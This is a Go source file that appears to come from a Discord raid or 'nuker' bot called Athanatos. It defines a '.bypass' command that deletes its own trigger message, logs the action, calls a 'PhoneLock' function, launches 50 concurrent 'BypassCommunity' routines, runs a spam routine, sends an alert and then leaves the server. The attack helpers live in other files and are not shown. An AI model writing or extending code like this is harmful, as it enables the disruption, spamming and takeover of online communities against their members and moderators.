package commands

import (
	"Athanatos/core/bypass"
	"Athanatos/core/requests"
	"Athanatos/core/start_end"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

var (
	usedOnServers_b = make(map[string]bool)
	mutex_b         = &sync.Mutex{}

	queue_b = make(chan string, 100)
)

func BypassAll(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	guildID := m.GuildID

	queue_b <- m.GuildID
	requests.HandleQueue(s)

	if m.Content == ".bypass" {
		if usedOnServers_b[guildID] {
			s.ChannelMessageSend(m.ChannelID, "# Error!\n**`This command has been already used on this server.`**")
		} else {
			usedOnServers_b[guildID] = true

			s.ChannelMessageDelete(m.ChannelID, m.ID)

			mutex_b.Lock()
			defer mutex_b.Unlock()

			start_end.Logs(s, m)
			bypass.PhoneLock(m)

			for i := 0; i < 50; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					bypass.BypassCommunity(s, m, wg)
				}()
			}

			time.Sleep(2 * time.Second)

			bypass.BypassSpam(s, m, wg)

			start_end.LogsAlert(s, m)
			start_end.Leave(s, m)
		}
	} else {
		return
	}
}
